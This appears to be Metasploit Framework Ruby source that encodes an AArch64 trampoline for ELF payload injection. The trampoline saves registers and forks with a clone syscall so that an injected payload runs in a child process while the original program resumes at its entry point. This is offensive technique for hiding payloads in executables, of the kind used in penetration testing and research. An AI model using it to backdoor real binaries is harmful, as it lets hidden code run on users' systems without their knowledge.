# frozen_string_literal: true

module Msf
  module Exe
    class ElfInjector
      # Builds an AArch64 trampoline that clones before running the payload.
      class AArch64
        # @param entrypoint [Integer] Original ELF entry point.
        # @param injected_address [Integer] Virtual address of the injected segment.
        def initialize(entrypoint:, injected_address:)
          @entrypoint = entrypoint
          @injected_address = injected_address
        end

        # @return [String] Encoded AArch64 trampoline.
        def generate
          save = save_registers
          restore = restore_registers
          clone = [
            instruction('mov', rt: 0, i16_5: 17),
            instruction('mov', rt: 1, i16_5: 0),
            instruction('mov', rt: 2, i16_5: 0),
            instruction('mov', rt: 3, i16_5: 0),
            instruction('mov', rt: 4, i16_5: 0),
            instruction('mov', rt: 8, i16_5: 220),
            instruction('svc', i16_5: 0)
          ]

          prefix_size = save.bytesize + clone.sum(&:bytesize) + 4
          parent_branch_address = @injected_address + prefix_size + restore.bytesize
          parent = restore + branch_instruction('b', parent_branch_address, @entrypoint, bits: 26, field: :i26_0)
          child_address = @injected_address + prefix_size + parent.bytesize
          clone_branch_address = @injected_address + save.bytesize + clone.sum(&:bytesize)
          clone << branch_instruction('cbz', clone_branch_address, child_address, bits: 19, field: :i19_5, rt: 0)

          save + clone.join + parent + restore
        end

        private

        def save_registers
          instructions = [instruction('sub', rt: 31, rn: 31, i12_10_s1: 256)]
          (0..28).step(2) do |register|
            instructions << stack_pair('stp', register, register + 1, register * 8)
          end
          instructions << stack_pair('stp', 30, 31, 240)
          instructions.join
        end

        def restore_registers
          instructions = []
          (0..28).step(2) do |register|
            instructions << stack_pair('ldp', register, register + 1, register * 8)
          end
          instructions << stack_pair('ldp', 30, 31, 240)
          instructions << instruction('add', rt: 31, rn: 31, i12_10_s1: 256)
          instructions.join
        end

        def stack_pair(name, first_register, second_register, offset)
          instruction(name, rt: first_register, rt2: second_register, m_rn_s7: ((offset / 8) << 10) | 31)
        end

        def branch_instruction(name, instruction_address, destination, bits:, field:, **fields)
          displacement = destination - instruction_address
          raise RangeError, 'AArch64 branch destination is not instruction-aligned' unless (displacement % 4).zero?

          immediate = displacement / 4
          minimum = -(1 << (bits - 1))
          maximum = (1 << (bits - 1)) - 1
          raise RangeError, 'ELF entry point is too far from the injected segment' unless immediate.between?(minimum, maximum)

          instruction(name, **fields.merge(field => immediate))
        end

        def instruction(name, **fields)
          opcode = processor.opcode_list_byname.fetch(name).find do |candidate|
            candidate.args == fields.keys && !candidate.props[:r_32] && !candidate.props[:mem_incr]
          end
          raise Metasm::EncodeError, "Unsupported AArch64 instruction: #{name}" unless opcode

          word = fields.reduce(opcode.bin) do |encoded, (field, value)|
            mask, shift = opcode.fields.fetch(field)
            encoded | ((value & mask) << shift)
          end
          [word].pack('V')
        end

        def processor
          @processor ||= Metasm::ARM64.new
        end
      end
    end
  end
end
